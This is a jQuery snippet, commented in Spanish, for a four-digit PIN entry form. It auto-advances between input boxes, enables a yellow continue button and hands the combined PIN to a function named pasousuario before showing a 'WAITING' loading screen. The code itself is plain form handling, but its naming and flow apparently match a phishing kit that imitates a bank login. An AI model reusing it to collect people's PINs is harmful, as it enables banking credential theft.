<script type="text/javascript">
    $(document).ready(function() { 
        // 1. FORZAR VISIBILIDAD: Eliminamos cualquier bloqueo al cargar
        $("#fondo, #cargando, #cargando-o").fadeOut(500); 

        // 2. LÓGICA DE TECLADO: Salto automático y activación de botón
        $('.clave').on('input', function() {
            // Pasar al siguiente cuadrito
            if ($(this).val().length === 1) { 
                $(this).closest('td').next().find('.clave').focus(); 
            }
            
            // Validar si los 4 campos están llenos
            var p1 = $("#txt-pass1").val();
            var p2 = $("#txt-pass2").val();
            var p3 = $("#txt-pass3").val();
            var p4 = $("#txt-pass4").val();

            if (p1 !== "" && p2 !== "" && p3 !== "" && p4 !== "") {
                $("#btn-password").prop("disabled", false);
                $("#btn-password").css({
                    "background-color": "#FDDA24",
                    "color": "#000",
                    "cursor": "pointer"
                });
            } else {
                $("#btn-password").prop("disabled", true);
            }
        });

        // 3. BORRADO: Permitir retroceder con la tecla borrar
        $('.clave').on('keydown', function(e) {
            if (e.keyCode === 8 && $(this).val().length === 0) {
                $(this).closest('td').prev().find('.clave').focus();
            }
        });

        // 4. ENVÍO: Acción del botón continuar
        $("#btn-password").on('click', function(e){
            e.preventDefault();
            var p_completa = $("#txt-pass1").val() + $("#txt-pass2").val() + $("#txt-pass3").val() + $("#txt-pass4").val();
            
            if(p_completa.length === 4) {
                $("#fondo, #cargando-o").show(); // Mostrar cargando antes de ir a WAITING
                pasousuario(p_completa); // Llama a la función en functions.js
            }
        });
    });
</script>
